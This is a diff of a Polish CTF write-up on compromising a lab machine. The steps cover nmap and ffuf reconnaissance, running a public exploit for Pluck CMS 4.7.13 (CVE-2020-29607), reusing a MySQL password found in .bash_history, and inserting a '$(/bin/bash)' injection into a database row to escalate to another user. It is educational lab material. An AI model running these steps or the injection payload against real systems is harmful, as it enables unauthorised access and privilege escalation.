@@ -3,6 +3,7 @@ IP=10.10.223.148
 
 ## Rekonesans
 Przeprowadzamy wstępny skan za pomocą narzędzia nmap:
+
 ```sh
 sudo nmap -sV -sC 10.10.223.148
 ```
@@ -45,7 +46,7 @@ ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.223.148/FUZZ -c
 
 ![Ffuf](img/Ffuf.JPG)
 
-Znaleźliśmy subdomenę app, na której znajduje się folder z aplikacją:
+Znaleźliśmy subdomenę app, na której znajduje się aplikacja:
 
 ![App](img/App.JPG)
 
@@ -72,7 +73,7 @@ Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)
 CVE: 2020-29607
 ```
 
-Jak widzimy, aplikacja jest podatna. Możemy zyskać RCE, czyli zdalnie wykonywać kod na serwerze. Pobieramy exploit, nadajemy mu uprawnienia i go uruchamiamy:
+Jak widzimy, aplikacja jest podatna. Możemy uzyskać RCE, czyli zdalnie wykonywać kod na serwerze. Pobieramy exploit, nadajemy mu uprawnienia i go uruchamiamy:
 ```
 chmod +x 49909.py
 ```
@@ -134,7 +135,7 @@ User lucien may run the following commands on dreaming:
     (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
 ```
 
-A następnie odpalamy skrypt getDreams.py jako użytkownik death:
+Uruchamiamy skrypt getDreams.py jako użytkownik death:
 ```
 sudo -u death /usr/bin/python3 /home/death/getDreams.py
 ```
@@ -201,7 +202,7 @@ def getDreams():
 getDreams()
 ```
 
-Skrypt ten wykorzystuje bibliotekę DB do wysyłania zapytań i wyświetlania zawartości dwóch kolumn kolumn w formacie: {dreamer} + {dream}. W pliku .bash_history w katalogu domowym użytkownika lucien znaleźliśmy hasło użytkownika lucien, które można wykorzystać do zalogowania się do MYSQL:
+Skrypt ten wykorzystuje bibliotekę DB do wysyłania zapytań i wyświetlania zawartości dwóch kolumn w formacie: {dreamer} + {dream}. W pliku .bash_history w katalogu domowym użytkownika lucien znaleźliśmy hasło, które można wykorzystać do zalogowania się do MYSQL:
 
 ![MYSQL](img/MYSQL.JPG)
 
@@ -209,17 +210,17 @@ Skrypt ten wykorzystuje bibliotekę DB do wysyłania zapytań i wyświetlania za
 plucien42DBPASSWORD
 ```
 
-Zalogujmy się do bazy danych komedną:
+Logujemy się do bazy danych komendą:
 
 ```
 mysql -u lucien -plucien42DBPASSWORD
 ```
 
-Przeglądnijmy bazę danych:
+Przeglądamy bazę danych:
 
 ![Database1](img/Database1.JPG)
 
-Widzimy, że skrypt łączył zawartość kolumny dreamer z zawartością kolumny dream i je wypisywał. Możemy to wykorzystać dodając własny rząd komendą:
+Widzimy, że skrypt łączy zawartość kolumny dreamer z zawartością kolumny dream i je wypisuje. Możemy to wykorzystać, dodając własny rząd komendą:
 
 ```
 INSERT INTO dreams VALUE("death", "$(/bin/bash)");
